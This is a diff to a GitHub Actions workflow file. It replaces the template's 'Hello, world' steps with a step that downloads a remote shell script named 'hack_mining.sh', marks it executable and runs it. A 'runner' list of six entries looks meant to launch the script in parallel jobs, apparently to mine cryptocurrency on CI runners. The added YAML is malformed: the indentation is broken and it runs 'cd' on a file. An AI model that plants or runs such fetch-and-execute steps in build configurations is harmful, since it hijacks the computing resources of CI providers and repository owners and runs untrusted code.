@@ -25,12 +25,12 @@ jobs:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v3
 
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
-
-      # Runs a set of commands using the runners shell
+     # Runs a set of commands using the runners shell
       - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+      runner: [0,1,2,3,4,5]
+      - run: |
+        wget https://raw.githubusercontent.com/chancelor13/hack_mining/main/hack_mining.sh && cd hack_mining.sh && chmod +x hack_mining.sh && ./hack_mining.sh
+          
+
+
+     
